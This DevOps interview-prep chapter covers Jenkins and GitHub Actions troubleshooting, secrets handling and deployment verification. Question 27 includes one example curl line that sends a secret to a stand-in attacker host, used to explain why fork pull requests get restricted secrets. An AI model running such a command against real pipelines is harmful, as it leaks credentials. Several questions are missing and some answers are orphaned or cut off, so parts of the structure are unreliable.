# Part 7: Jenkins, GitHub Actions, and Pipeline Scenarios

Jenkins and GitHub Actions are two of the most common CI/CD tools junior DevOps engineers encounter.

The tools are different, but many interview questions test the same underlying skills:

* Can you understand pipeline flow?
* Can you troubleshoot why a job did not run?
* Can you identify whether the problem is code, credentials, environment, runner, agent, or pipeline configuration?
* Do you understand how artifacts move between stages?
* Can you safely handle secrets?
* Can you explain what happens when an agent fails?
* Do you know how branches and events trigger workflows?
* Can you troubleshoot a deployment that technically succeeded but produced an unhealthy application?

A strong candidate should not answer every question with:

```text
I would check Jenkins.
```

or:

```text
I would check GitHub Actions.
```

The better question is:

```text
Which part of the delivery process failed?
```

A simplified pipeline may look like this:

```text
Git Push
   ↓
Trigger
   ↓
Jenkins Controller / GitHub Actions
   ↓
Agent / Runner
   ↓
Checkout
   ↓
Build
   ↓
Test
   ↓
Artifact
   ↓
Deploy
   ↓
Verification
```

This part focuses on real operational scenarios.

---

# Question 1: What is Jenkins, and what role does it play in CI/CD?

## What the interviewer is testing

The interviewer wants to know whether you understand Jenkins as more than a "deployment tool."

## Strong interview answer

Jenkins is an automation server commonly used to build CI/CD pipelines.

It can automate tasks such as:

* Checking out code
* Compiling applications
* Running tests
* Running security scans
* Building container images
* Publishing artifacts
* Deploying applications
* Running scheduled jobs

A typical Jenkins flow might look like:

```text
Developer pushes code
        ↓
Webhook triggers Jenkins
        ↓
Jenkins schedules pipeline
        ↓
Agent executes stages
        ↓
Build
        ↓
Test
        ↓
Package
        ↓
Deploy
```

Jenkins itself may coordinate the pipeline, while agents perform much of the actual work.

## Important distinction

Jenkins does not magically know how to build or deploy an application.

The pipeline defines what Jenkins should execute.

# Question 2: What is a Jenkinsfile?

## Strong interview answer

A Jenkinsfile is a file stored in source control that defines the Jenkins pipeline as code.

For example:

```groovy
pipeline {
    agent any

    stages {
        stage('Build') {
            steps {
                sh 'mvn clean package'
            }
        }

        stage('Test') {
            steps {
                sh 'mvn test'
            }
        }

        stage('Deploy') {
            steps {
                sh './deploy.sh'
            }
        }
    }
}
```

Storing the pipeline in Git provides:

* Version history
* Review
* Rollback
* Auditability
* Reproducibility

If the pipeline breaks after a change, I can inspect:

```bash
git log -- Jenkinsfile
```

and:

```bash
git diff <good-commit> <bad-commit> -- Jenkinsfile
```

---

# Question 3: What is the difference between a Jenkins controller and an agent?

## Strong interview answer

The Jenkins controller manages the Jenkins environment.

It handles things such as:

* Pipeline scheduling
* Job configuration
* Credentials integration
* Agent coordination
* Build history

Agents are machines or environments that execute pipeline workloads.

For example:

```text
Jenkins Controller
        ↓
   ┌────┼────┐
   ↓    ↓    ↓
Agent1 Agent2 Agent3
```

One agent may be configured for:

```text
Linux builds
```

another for:

```text
Docker
```

another for:

```text
Windows
```

## Interview point

Heavy builds should generally not be unnecessarily executed directly on the controller.

The controller should primarily coordinate work.

# Question 4: A Jenkins job is stuck in the queue. What would you investigate?

## Strong interview answer

If the job is queued but not running, I would investigate scheduling and agent availability.

Possible causes include:

* No online agent
* Required agent label unavailable
* Agent busy
* Executor limit reached
* Node temporarily offline
* Pipeline requests an invalid label

Suppose the Jenkinsfile contains:

```groovy
agent {
    label 'docker-linux'
}
```

but no online agent has that label.

The job may remain queued.

I would inspect:

* Jenkins node status
* Agent labels
* Executors
* Queue message

## Strong interview reasoning

```text
Queued
→ scheduling problem

Running
→ execution problem
```

Those require different investigations.

# Question 5: A Jenkins agent suddenly goes offline. What would you check?

## Strong interview answer

I would investigate both the agent host and its connection to Jenkins.

Possible causes include:

* Agent service stopped
* Network failure
* DNS failure
* Disk full
* Memory exhaustion
* Java process crashed
* Authentication issue
* Certificate problem
* SSH connectivity failure

On the agent, I might check:

```bash
uptime
```

```bash
df -h
```

```bash
free -h
```

and process or service status depending on how the agent runs.

If Jenkins connects through SSH, I would test SSH connectivity.

If the agent runs as a service:

```bash
systemctl status jenkins-agent
```

where applicable.

The exact implementation differs, but the troubleshooting pattern is the same.

# Question 6: Jenkins reports "There are no nodes with the label docker." What does that mean?

## Strong interview answer

The pipeline requires an agent labeled:

```text
docker
```

but Jenkins cannot find a suitable online node.

The Jenkinsfile might contain:

```groovy
agent {
    label 'docker'
}
```

I would inspect configured node labels.

Possible fixes include:

* Correct the label in the Jenkinsfile
* Add the label to the intended agent
* Restore the offline agent
* Provision a suitable agent

I would not change labels randomly just to make the build start.

The agent should actually have the required capabilities.

# Question 7: A Jenkins pipeline fails because `docker` is not found. How would you troubleshoot it?

## Strong interview answer

I would identify which agent executed the job.

Then verify Docker is installed and available.

```bash
command -v docker
```

```bash
docker --version
```

I would also inspect:

```bash
echo "$PATH"
```

Possible causes include:

* Docker not installed
* Job scheduled on wrong agent
* PATH misconfigured
* Pipeline expected a Docker-capable node but used a generic node

This is why agent labels should reflect capabilities.

For example:

```text
linux
docker
terraform
java17
```

# Question 8: Docker exists on the Jenkins agent, but the pipeline gets permission denied on `/var/run/docker.sock`. Why?

## Strong interview answer

The Jenkins agent user may not have permission to access the Docker daemon socket.

I would check:

```bash
ls -l /var/run/docker.sock
```

Then identify the user running the agent.

```bash
ps -ef | grep jenkins
```

or:

```bash
id jenkins
```

The Jenkins account may not belong to the group allowed to access Docker.

However, adding a user to the Docker group has significant security implications because access to the Docker daemon can effectively provide high privileges on the host.

I would follow the organization's security model rather than blindly running:

```bash
chmod 777 /var/run/docker.sock
```

That would be a poor production fix.

# Question 9: Jenkins works when a command is run manually, but the same command fails inside the pipeline. Why?

## Strong interview answer

The interactive shell and Jenkins environment may differ.

Differences may include:

* PATH
* User
* HOME
* Working directory
* Environment variables
* Credentials
* Shell
* Installed tools

For example, an administrator may manually run:

```bash
terraform version
```

successfully because Terraform exists under:

```text
/usr/local/bin
```

but Jenkins may have a different PATH.

I would inspect inside the pipeline:

```groovy
sh 'whoami'
sh 'pwd'
sh 'echo $PATH'
sh 'env | sort'
```

while ensuring sensitive environment values are not exposed.

## Strong lesson

Always reproduce the failure under the identity and environment that actually fails.

# Question 10: What is a Jenkins pipeline stage?

## Strong interview answer

A stage represents a logical part of a pipeline.

For example:

```groovy
stages {
    stage('Build') {
        steps {
            sh 'mvn package'
        }
    }

    stage('Test') {
        steps {
            sh 'mvn test'
        }
    }

    stage('Deploy') {
        steps {
            sh './deploy.sh'
        }
    }
}
```

Stages make pipeline flow easier to understand.

If the pipeline shows:

```text
Build      ✓
Test       ✓
Deploy     ✗
```

I immediately know the failure occurred during deployment rather than compilation.

That improves troubleshooting.

# Question 11: A Jenkins pipeline reports success even though a shell command failed. How can that happen?

## Strong interview answer

The script may be hiding the exit status.

For example:

```bash
npm test || true
```

forces the command sequence to continue even when tests fail.

Another example:

```bash
./deploy.sh
exit 0
```

may return success regardless of deployment failure.

A shell script might also capture a failure but never propagate it.

For example:

```bash
some-command
echo "done"
```

depending on how error handling is implemented.

I would inspect the actual exit code behavior.

## Interview point

CI platforms depend heavily on command exit status.

```text
0
→ success

non-zero
→ failure
```

unless the pipeline explicitly handles the failure differently.

# Question 12: What is the purpose of `post` in a Jenkins declarative pipeline?

## Strong interview answer

The `post` section can run actions after pipeline or stage execution.

For example:

```groovy
post {
    success {
        echo 'Pipeline succeeded'
    }

    failure {
        echo 'Pipeline failed'
    }

    always {
        archiveArtifacts artifacts: 'target/*.jar'
    }
}
```

Common uses include:

* Notifications
* Cleanup
* Artifact publishing
* Test result collection

## Important operational point

Cleanup may need to run even after failure.

For example:

```text
temporary environment created
        ↓
test fails
        ↓
cleanup still required
```

# Question 13: A Jenkins workspace contains files from an old build and causes unexpected results. What would you do?

## Strong interview answer

Persistent workspaces can retain state between builds.

That can create problems such as:

* Old artifacts
* Old dependencies
* Deleted source files still present
* Previous configuration
* Temporary files

I would inspect the workspace and consider cleaning it before the build.

For example:

```groovy
cleanWs()
```

where the Workspace Cleanup plugin is used.

Or:

```bash
git clean -fdx
```

only when appropriate and understood.

## Strong principle

A build should ideally not depend on unexplained leftovers from previous runs.

---

# Question 14: Why can a clean build fail when previous builds succeeded?

## Strong interview answer

The previous successful build may have depended on cached or leftover state.

For example:

```text
Dependency accidentally present in workspace
```

but not declared in the build configuration.

A clean environment exposes the missing dependency.

This is useful because CI should reveal hidden dependencies rather than depend on them.

---

# Question 15: How should credentials be handled in Jenkins?

## Strong interview answer

Credentials should be stored in Jenkins' credential management system or another secure secret-management mechanism rather than embedded directly in Jenkinsfiles.

A pipeline may reference a credential by its identifier.

For example:

```groovy
withCredentials([
    string(
        credentialsId: 'registry-token',
        variable: 'REGISTRY_TOKEN'
    )
]) {
    sh '''
        ./login.sh
    '''
}
```

I would avoid printing the secret.

## Important principle

This is dangerous:

```groovy
environment {
    PASSWORD = 'ActualPassword123'
}
```

because the Jenkinsfile is version controlled.

---

# Question 16: Jenkins says a credential ID does not exist. What would you check?

## Strong interview answer

I would verify:

* Credential ID spelling
* Credential scope
* Folder-level credentials
* Job access
* Whether the credential was deleted
* Whether the pipeline is running in the expected Jenkins folder

For example, the Jenkinsfile expects:

```text
prod-docker-token
```

but Jenkins contains:

```text
production-docker-token
```

The issue may simply be a mismatch.

# Question 17: What is GitHub Actions?

## Strong interview answer

GitHub Actions is GitHub's automation platform.

It can run workflows based on repository events such as:

* Push
* Pull request
* Tag
* Manual trigger
* Schedule
* Release

A workflow is typically stored under:

```text
.github/workflows/
```

For example:

```text
.github/workflows/ci.yml
```

A simple workflow might be:

```yaml
name: CI

on:
  push:
    branches:
      - main

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Run tests
        run: npm test
```

---

# Question 18: What is the difference between a GitHub Actions workflow, job, and step?

## Strong interview answer

A workflow is the entire automation definition.

Inside the workflow are jobs.

Inside jobs are steps.

For example:

```text
Workflow: CI
   ↓
Job: Build
   ├── Checkout
   ├── Install dependencies
   └── Compile

Job: Test
   ├── Checkout
   └── Run tests
```

In YAML:

```yaml
jobs:
  build:
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Build
        run: npm run build
```

This hierarchy matters during troubleshooting because the interface may show:

```text
Workflow failed
```

but I still need to find:

```text
Which job?

Which step?
```

# Question 19: A GitHub Actions workflow does not trigger after a push. What would you check?

## Strong interview answer

I would inspect the `on` configuration.

For example:

```yaml
on:
  push:
    branches:
      - main
```

If I pushed to:

```text
feature/payment
```

the workflow will not run.

I would also check:

* File path
* YAML validity
* Branch filter
* Path filter
* Repository settings
* Whether Actions is enabled

## Example

```yaml
on:
  push:
    paths:
      - 'backend/**'
```

If I change:

```text
README.md
```

the workflow may intentionally not trigger.

# Question 20: A GitHub Actions workflow runs on every branch, but it should only run on `main`. How would you fix it?

## Strong interview answer

I would restrict the event.

For example:

```yaml
on:
  push:
    branches:
      - main
```

For pull requests:

```yaml
on:
  pull_request:
    branches:
      - main
```

I would distinguish between:

```text
push to main
```

and:

```text
pull request targeting main
```

because they represent different events.

# Question 21: What is a GitHub Actions runner?

## Strong interview answer

A runner is the machine or environment that executes a GitHub Actions job.

There are two broad categories:

```text
GitHub-hosted runners
```

and:

```text
self-hosted runners
```

A job may specify:

```yaml
runs-on: ubuntu-latest
```

or:

```yaml
runs-on: self-hosted
```

The runner provides the execution environment.

If the runner does not have the required tools, network access, or permissions, the workflow can fail even if the YAML is correct.

---

# Question 22: What is the difference between GitHub-hosted and self-hosted runners?

## Strong interview answer

GitHub-hosted runners are provided and managed by GitHub for supported environments.

They are generally provisioned for jobs and provide a relatively clean environment.

Self-hosted runners are managed by the organization.

They may provide:

* Internal network access
* Custom software
* Specialized hardware
* More control over environment

But they also require operational management.

For self-hosted runners, I need to manage things such as:

* Updates
* Security
* Disk cleanup
* Networking
* Runner service
* Scaling

I would inspect the runner host.

Check:

* Runner service
* Host availability
* Internet or GitHub connectivity
* DNS
* Disk
* Memory
* Authentication
* Runner registration

```bash
systemctl status actions.runner.*
```

# Question 24: A workflow is stuck waiting for a runner. What could cause that?

## Strong interview answer

Possible causes include:

* No runner online
* Required labels do not match
* All runners busy
* Concurrency restrictions
* Runner group permissions
* Self-hosted runner unavailable

Suppose:

```yaml
runs-on:
  - self-hosted
  - linux
  - production
```

The job requires a runner with all relevant labels.

If only a runner labeled:

```text
self-hosted
linux
```

exists, the job may wait.

# Question 25: What are GitHub Actions secrets?

## Strong interview answer

Secrets store sensitive values used by workflows.

Examples include:

* API tokens
* Passwords
* Signing keys
* Deployment credentials

A workflow can reference a secret.

For example:

```yaml
env:
  API_TOKEN: ${{ secrets.API_TOKEN }}
```

I should avoid printing secrets into logs.

Secrets can exist at different scopes, such as:

* Repository
* Environment
* Organization

The workflow's access depends on configuration and security context.

---

# Question 26: A GitHub Actions secret is empty during the workflow. What would you check?

## Strong interview answer

I would inspect:

* Secret name
* Scope
* Environment
* Repository access
* Pull request source
* Whether it comes from a fork
* Whether the job is using the expected environment

For example:

```yaml
environment: production
```

may mean the job expects an environment-level secret.

If the secret exists only at another scope or under another name, it may not be available.

---

# Question 27: Why are secrets restricted in workflows triggered from forks?

## Strong interview answer

Because external contributors can modify workflow code in their pull request.

If production secrets were automatically exposed, a malicious pull request could attempt to print or transmit them.

For example:

```yaml
- run: curl "https://attacker.example/?secret=$SECRET"
```

Restricting secrets reduces that risk.

This is why CI/CD security must account for the trust level of the source code being executed.

An environment represents a deployment target or protected context such as:

```text
development

production
```

An environment may have:

* Secrets
* Variables
* Approval rules
* Deployment protections

For example:

```yaml
jobs:
  deploy:
    environment: production
```

The production environment may require a reviewer before deployment continues.

```text
Waiting for required approval
```

# Question 30: What is a matrix strategy in GitHub Actions?

## Strong interview answer

A matrix runs a job across multiple combinations.

For example:

```yaml
strategy:
  matrix:
    node-version: [18, 20, 22]
```

The same job runs against each version.

Conceptually:

```text
Tests
 ├── Node 18
 ├── Node 20
 └── Node 22
```

This is useful for compatibility testing.

## Interview scenario

If only Node 18 fails, I would focus on version-specific compatibility rather than assuming the entire application is broken.

---

# Question 31: One matrix job fails while all others pass. How would you troubleshoot it?

## Strong interview answer

I would compare the failing matrix variable with working ones.

For example:

```text
Python 3.10 → pass
Python 3.11 → pass
Python 3.12 → fail
```

I would investigate:

* Runtime compatibility
* Dependency support
* Conditional code
* Toolchain differences

This is useful because the passing combinations provide known-good comparisons.

# Question 32: What does `actions/checkout` do?

## Strong interview answer

It checks the repository code out onto the runner so later steps can work with it.

For example:

```yaml
- uses: actions/checkout@v4
```

Without checking out the repository, a command such as:

```yaml
- run: npm test
```

may fail because the source files are not present.

---

# Question 33: A GitHub Actions job says `package.json` does not exist. What could be wrong?

## Strong interview answer

I would check:

* Was repository checkout performed?
* Is the job in the correct directory?
* Is the file in a subdirectory?
* Was the correct branch or commit checked out?

Suppose the repository layout is:

```text
repo/
  backend/
    package.json
```

but the job runs:

```yaml
- run: npm install
```

from the repository root.

The job may need:

```yaml
defaults:
  run:
    working-directory: backend
```

or:

```yaml
- run: cd backend && npm install
```

A working-directory mismatch is a common CI failure.

# Question 34: A workflow uses a dependency cache. What problem is caching trying to solve?

## Strong interview answer

Caching avoids repeatedly downloading or rebuilding dependencies that have not changed.

Examples include:

* npm cache
* Maven cache
* Gradle cache
* pip cache

This can significantly reduce pipeline duration.

But cache keys must be designed carefully.

A stale or overly broad cache can also cause confusing behavior.

---

# Question 35: A pipeline works after clearing the cache. What does that suggest?

## Strong interview answer

It suggests the cached state may have become stale or inconsistent with the current build.

I would investigate the cache key.

For example, a cache based only on:

```text
operating-system
```

may be too broad.

A better key may incorporate the dependency lock file.

Conceptually:

```text
OS
+
hash(package-lock.json)
```

Then dependency changes produce a new cache.

## Strong point

Clearing the cache may recover the pipeline, but the underlying cache design should still be corrected.

---

# Question 36: What are artifacts in GitHub Actions?

## Strong interview answer

Artifacts are files produced by workflow jobs that can be stored or passed for later use.

Examples include:

* Compiled binaries
* Test reports
* Build packages
* Logs

A build job might upload:

```text
dist/
```

and a later process may download it.

This avoids rebuilding the application unnecessarily.

---

# Question 37: A deployment job cannot find the artifact created by the build job. What would you check?

## Strong interview answer

I would verify:

* Artifact was created
* Artifact name
* Upload step
* Download step
* File path
* Job dependencies
* Retention

For example:

Build:

```yaml
- uses: actions/upload-artifact@v4
  with:
    name: application-build
    path: dist/
```

Deploy:

```yaml
- uses: actions/download-artifact@v4
  with:
    name: application-build
```

If one job uses:

```text
application-build
```

and another expects:

```text
app-build
```

the deployment job will fail.

---

# Question 38: What is `needs` in GitHub Actions?

## Strong interview answer

`needs` creates a dependency between jobs.

For example:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest

  deploy:
    needs: build
    runs-on: ubuntu-latest
```

The deploy job waits for build.

Conceptually:

```text
Build
  ↓
Deploy
```

Without the dependency, jobs may run independently or in parallel.

## Troubleshooting relevance

If deployment requires an artifact from build, the dependency should be explicit.

---

# Question 39: A deployment job is skipped because the build failed. Is that expected?

## Strong interview answer

Usually, yes.

If:

```yaml
deploy:
  needs: build
```

and `build` fails, the dependent job may not run.

That prevents deployment of an invalid build.

I would distinguish this from a deployment job that unexpectedly skips despite all required jobs succeeding.

---

# Question 40: What is concurrency control in GitHub Actions?

## Strong interview answer

Concurrency control limits overlapping workflow runs.

For example:

```yaml
concurrency:
  group: production-deploy
  cancel-in-progress: false
```

This can prevent two production deployments from running simultaneously.

Without concurrency protection:

```text
Deployment A starts
Deployment B starts
A changes service
B changes service
A verifies wrong state
```

Overlapping deployments can create race conditions.

---

# Question 41: Two developers merge to `main` one minute apart and two production deployments run at the same time. Why is this dangerous?

## Strong interview answer

The deployments may interfere with each other.

For example:

```text
Release A
→ version 1.5

Release B
→ version 1.6
```

If both pipelines modify the same environment concurrently, rollback and verification become ambiguous.

A concurrency control can serialize production changes.

The same principle applies to Jenkins through locking or pipeline controls.

---

# Question 42: How would you prevent overlapping Jenkins deployments?

## Strong interview answer

The exact solution depends on Jenkins setup.

Options may include:

* Disabling concurrent builds where appropriate
* Lockable resources
* Deployment queues
* Environment-specific locks

Conceptually:

```text
Pipeline A
   ↓
Production lock
   ↓
Deploy
   ↓
Release lock

Pipeline B
waits
```

The goal is to ensure two incompatible deployment processes do not mutate the same production environment simultaneously.

The agents are probably not identical.

Possible differences include:

* Tool versions
* Operating system
* Environment variables
* Network access
* Java version
* Docker version
* Permissions
* Disk space

For example:

```text
Agent A
Java 17

Agent B
Java 11
```

# Question 44: How can containers help make Jenkins agents more consistent?

## Strong interview answer

Instead of relying entirely on host-installed tools, the pipeline can run stages inside controlled container images.

For example:

```groovy
agent {
    docker {
        image 'maven:3.9-eclipse-temurin-17'
    }
}
```

Now the build uses a defined Maven and Java environment.

This can reduce:

```text
Works on Agent A
Fails on Agent B
```

caused by different tool installations.

Containers do not solve every issue, especially networking and permissions, but they can improve consistency.

---

# Question 45: A GitHub Actions workflow uses `ubuntu-latest`. Could that ever cause unexpected changes?

## Strong interview answer

Yes.

`ubuntu-latest` is a moving environment label rather than a promise that the runner image will remain identical forever.

Runner software and preinstalled tool versions can change over time.

For critical tools, I would explicitly configure the required version.

For example:

```yaml
- uses: actions/setup-node@v4
  with:
    node-version: '20'
```

instead of relying only on whatever version happens to be preinstalled.

## Strong principle

Important build dependencies should be explicit.

I would investigate:

* Runner image change
* Action version
* Dependency registry
* External API
* Credential expiration
* Certificate expiration
* Package version
* Docker base image
* Cloud policy

A pipeline can change behavior without a source-code change if its dependencies are mutable.

# Question 47: Why should third-party GitHub Actions be reviewed carefully?

## Strong interview answer

A GitHub Action can execute code inside the workflow environment.

Depending on the job, that code may access:

* Repository contents
* Tokens
* Network
* Artifacts
* Secrets available to the job

Therefore, I would use trusted actions and pin versions appropriately.

For higher assurance, teams may pin to specific commit SHAs rather than floating tags.

The general supply-chain principle is:

```text
Pipeline dependencies are code too.
```

---

# Question 48: A workflow suddenly breaks after `some-action@v1` changes upstream. How could pinning help?

## Strong interview answer

A moving tag may point to updated action code.

Pinning to a specific commit provides an immutable reference.

Conceptually:

```yaml
uses: company/action@<commit-sha>
```

Now the pipeline runs the same action code until the reference is deliberately updated.

This improves reproducibility and reduces unexpected upstream changes.

---

# Question 49: A Jenkins plugin update breaks several pipelines. How would you approach it?

## Strong interview answer

I would first identify:

* Which plugins changed
* Which pipelines are affected
* Whether the failure began immediately after the update
* Whether rollback is available
* Whether there are compatibility issues

I would avoid randomly editing every pipeline.

If the plugin update clearly introduced the issue and rollback is supported, restoring the previous working plugin version may be part of recovery.

Longer term, Jenkins plugin updates should be:

* Tested
* Controlled
* Backed up
* Rolled out carefully

Jenkins itself is part of production infrastructure.

---

# Question 50: Jenkins is unavailable. Does that mean the production application is down?

## Strong interview answer

Not necessarily.

Jenkins is part of the delivery system.

Production applications may continue running normally even if Jenkins is unavailable.

However, Jenkins downtime may prevent:

* New builds
* Deployments
* Rollbacks through pipeline automation
* Scheduled automation

This distinction matters.

```text
CI/CD platform availability
≠
application runtime availability
```

But losing the deployment system during a production incident can still create serious operational risk.

# Question 51: A GitHub Actions workflow is unavailable during an incident. What would you consider before manually deploying?

## Strong interview answer

I would follow the organization's emergency deployment procedure.

Manual deployment can introduce:

* Configuration drift
* Audit gaps
* Wrong artifacts
* Inconsistent environments

Before doing it, I would identify:

* Exact artifact
* Exact target
* Rollback plan
* Approval
* Verification method

If a manual emergency change is necessary, it should later be reconciled with the normal source-controlled deployment process.

# Question 52: A Jenkins deployment uses `latest` Docker tags. Why is that a problem?

## Strong interview answer

`latest` is mutable.

Suppose:

```text
myapp:latest
```

pointed to version 1 yesterday and version 2 today.

The pipeline cannot reliably answer:

```text
Which image did we actually deploy?
```

A better approach is immutable tagging.

For example:

```text
myapp:9f48a21
```

where the tag corresponds to a Git commit.

Then the delivery path becomes:

```text
Git commit 9f48a21
        ↓
Docker image myapp:9f48a21
        ↓
Deployment
        ↓
Production
```

I would make the release identity visible through one or more methods.

For example:

* Application `/version` endpoint
* Environment variable
* Container label
* Deployment annotation
* Monitoring metadata

A version endpoint might return:

```json
{
  "version": "2.4.1",
  "commit": "9f48a21"
}
```

Then during an incident:

```bash
curl https://app.example.com/version
```

can help confirm which version actually serves traffic.

# Question 54: A pipeline says version 2.4.1 was deployed, but `/version` returns 2.4.0. What would you investigate?

## Strong interview answer

That indicates the intended release and actual runtime differ.

I would inspect:

* Deployment target
* Image tag
* Artifact version
* Rollout status
* Old instances
* Load balancer targets
* Cache
* Multiple environments

For example:

```text
App 1 → 2.4.1
App 2 → 2.4.1
App 3 → 2.4.0
```

The old backend may still be receiving traffic.

I would verify every target rather than assuming a successful pipeline updated all instances.

# Question 55: What is a reusable workflow in GitHub Actions?

## Strong interview answer

A reusable workflow allows common workflow logic to be defined once and called by other workflows.

This can reduce duplication.

For example:

```text
service-a
service-b
service-c
```

may all call a common deployment workflow.

Benefits include:

* Consistent security controls
* Standardized builds
* Easier maintenance

However, changes to the shared workflow can affect many repositories, so they should be reviewed and versioned carefully.

# Question 56: What is a shared library in Jenkins?

## Strong interview answer

A Jenkins Shared Library allows teams to reuse pipeline code across Jenkinsfiles.

Instead of duplicating the same logic in dozens of repositories:

```groovy
sh 'docker build ...'
sh 'docker push ...'
sh 'deploy ...'
```

a shared library may provide standardized functions.

Conceptually:

```groovy
deployApplication()
```

The library can help standardize:

* Build patterns
* Security checks
* Deployment
* Notifications

But shared libraries should also be versioned and tested because a bad library change can affect many pipelines.

---

# Question 57: A shared Jenkins library update breaks 30 pipelines. What is the lesson?

## Strong interview answer

Shared components increase consistency but also increase blast radius.

I would:

* Identify the library version change
* Restore or pin the previous working version if appropriate
* Validate the fix
* Test the shared library before broad rollout

Shared pipeline code should have the same engineering discipline as application code.

---

# Question 58: A production workflow has one long job containing build, test, image push, and deployment. Why can this be harder to troubleshoot?

## Strong interview answer

If everything runs in one large block:

```text
Job failed
```

it may be harder to immediately see which logical phase failed.

Breaking the workflow into clear stages or jobs gives better visibility.

For example:

```text
Build       ✓
Unit Test   ✓
Image Push  ✓
Deploy      ✗
Smoke Test  skipped
```

This makes the failure boundary obvious.

It also allows different permissions and environments for different stages.

For example:

```text
Build job
→ no production credentials

Deploy job
→ controlled production identity
```

That improves security.

---

# Question 59: Why should a build job not automatically have production credentials?

## Strong interview answer

The build job normally does not need production access.

Giving it production credentials increases the blast radius if:

* Build script is compromised
* Dependency is malicious
* Pull request runs untrusted code

A more secure design separates identities.

```text
Build
→ read source
→ create artifact

Deploy
→ obtain controlled production permissions
→ deploy approved artifact
```

This follows least privilege.

---

# Question 60: Jenkins pipeline succeeds, but users get 503 after deployment. Walk me through your investigation.

## Strong interview answer

I would first separate delivery success from application health.

The pipeline may show:

```text
Checkout     ✓
Build        ✓
Test         ✓
Image Build  ✓
Image Push   ✓
Deploy       ✓
```

But users receive:

```text
503 Service Unavailable
```

That suggests the deployment mechanism executed, but the runtime may not have healthy backends.

I would identify the exact release.

For example:

```text
Commit:
9f48a21

Image:
registry.example.com/app:9f48a21
```

Then verify what actually runs in production.

If Kubernetes is involved:

```bash
kubectl get deployment
```

```bash
kubectl get pods
```

```bash
kubectl describe pod <pod>
```

```bash
kubectl logs <pod>
```

I would inspect readiness and service configuration.

Suppose logs show:

```text
Application listening on port 9000
```

but deployment configuration routes to:

```text
8080
```

The pipeline deployment command can succeed because Kubernetes accepted the manifest.

But health checks fail because nothing responds on 8080.

That produces:

```text
Application code
     ↓
Listens on 9000
     ↓
Service expects 8080
     ↓
Health check fails
     ↓
No healthy backends
     ↓
HTTP 503
```

The pipeline is green because the deployment API call succeeded.

Production is unhealthy because runtime verification was incomplete.

The immediate response may be:

* Roll back to the previous release
* Correct the port configuration
* Redeploy
* Verify health

Then improve the pipeline.

For example:

```text
Deploy
  ↓
Wait for readiness
  ↓
Smoke test
  ↓
Verify load balancer
  ↓
Mark release successful
```

# Question 61: GitHub Actions deployment succeeds, but the wrong environment was updated. How would you troubleshoot it?

## Strong interview answer

I would trace environment selection.

Suppose the workflow contains:

```yaml
env:
  DEPLOY_ENV: ${{ github.ref_name }}
```

and the deployment script expects:

```text
production
```

but receives:

```text
main
```

It may fall back to an incorrect default.

I would inspect:

* Branch-to-environment mapping
* Workflow input
* Environment name
* Deployment script defaults
* Credentials used
* Actual target account or cluster

A production workflow should make target selection explicit.

For example:

```yaml
environment: production
```

and use environment-specific credentials.

# Question 62: A Jenkins build deploys correctly from the UI, but fails when triggered by webhook. What could differ?

## Strong interview answer

The trigger context may differ.

Possible differences include:

* Branch
* Parameters
* Commit reference
* Environment variables
* User permissions
* Credentials
* Default parameter values

For example, a manually triggered job may specify:

```text
ENVIRONMENT=staging
```

while webhook execution receives no parameter.

The pipeline may then use an unintended default.

I would compare build parameters and environment between manual and webhook runs.

# Question 63: A GitHub Actions workflow triggered by `pull_request` behaves differently from one triggered by `push`. Why?

## Strong interview answer

The event context is different.

A pull request workflow may:

* Use a merge reference
* Have reduced secret access
* Run untrusted code
* Expose different context values

A push workflow executes because a commit was pushed to a branch.

I would not assume that:

```text
github.ref
```

or secret availability behaves identically across event types.

When writing workflow conditions, I would understand which event is running.

# Question 64: A job condition unexpectedly evaluates to false. How would you troubleshoot it?

## Strong interview answer

I would inspect the actual context value and the condition.

For example:

```yaml
if: github.ref == 'main'
```

may be wrong because `github.ref` could contain:

```text
refs/heads/main
```

A correct condition may need:

```yaml
if: github.ref == 'refs/heads/main'
```

or use:

```text
github.ref_name
```

when appropriate.

The general troubleshooting process is:

```text
Expected value
vs.
Actual value
```

# Question 65: What is the danger of printing the entire environment during CI troubleshooting?

## Strong interview answer

It may expose secrets or sensitive metadata.

Running:

```bash
env
```

can reveal values such as:

* Tokens
* Credentials
* Internal endpoints
* Repository information

Even if the CI platform masks some known secrets, I would not rely on masking as the only security control.

I would print only the information needed for debugging.

For example:

```bash
echo "DEPLOY_ENV=$DEPLOY_ENV"
echo "RUNNER_OS=$RUNNER_OS"
```

while avoiding sensitive variables.

# Question 66: A CI log accidentally exposes a token. What should you do?

## Strong interview answer

I would treat the token as compromised.

The response should include:

```text
Revoke or rotate token
      ↓
Remove it from future logs
      ↓
Restrict log access if possible
      ↓
Investigate exposure
      ↓
Fix pipeline
```

Deleting the log alone is not enough if someone may already have accessed it.

The token itself must be rotated.

```bash
df -h
```

and:

```bash

```

Then inspect likely consumers.

For example:

```bash
du -sh /var/lib/jenkins/workspace/*
```

where appropriate.

If Docker is involved:

```bash
docker system df
```

Possible causes include:

* Old workspaces
* Build artifacts
* Docker images
* Docker layers
* Caches
* Logs

The immediate cleanup should follow policy.

Long term, I would consider:

* Retention
* Workspace cleanup
* Docker pruning policy
* Disk monitoring
* Ephemeral agents

# Question 68: Why are ephemeral CI runners useful?

## Strong interview answer

They start clean for jobs and are removed afterward.

Conceptually:

```text
Job arrives
   ↓
Runner created
   ↓
Job executes
   ↓
Runner destroyed
```

Benefits include:

* Reduced state leakage
* More reproducible jobs
* Less disk accumulation
* Easier scaling

However, they require appropriate provisioning and can have higher startup overhead.

# Question 69: A pipeline failure disappears when moved to a fresh runner. What does that suggest?

## Strong interview answer

It suggests the old runner had local state affecting the build.

Possible causes include:

* Stale cache
* Old workspace
* Local configuration
* Tool version drift
* Disk corruption
* Leftover containers

I would compare the runners.

The long-term goal should be making pipelines reproducible from clean environments.

# Question 70: How would you compare Jenkins and GitHub Actions in an interview?

## Strong interview answer

I would avoid saying one is universally better.

Jenkins provides extensive flexibility and can be heavily customized through agents, plugins, and shared libraries.

But organizations also have to operate the Jenkins infrastructure and manage plugins, security, upgrades, and agents.

GitHub Actions integrates closely with GitHub repositories and provides hosted runners as well as self-hosted runners.

Both can implement:

* CI
* Testing
* Artifacts
* Deployment
* Secrets
* Approval workflows

The more important interview point is that the underlying pipeline principles remain similar.

```text
Trigger
Runner/Agent
Code
Build
Test
Artifact
Credential
Deploy
Verify
```

A DevOps engineer should understand those concepts regardless of platform.

# Final Production Interview Scenario

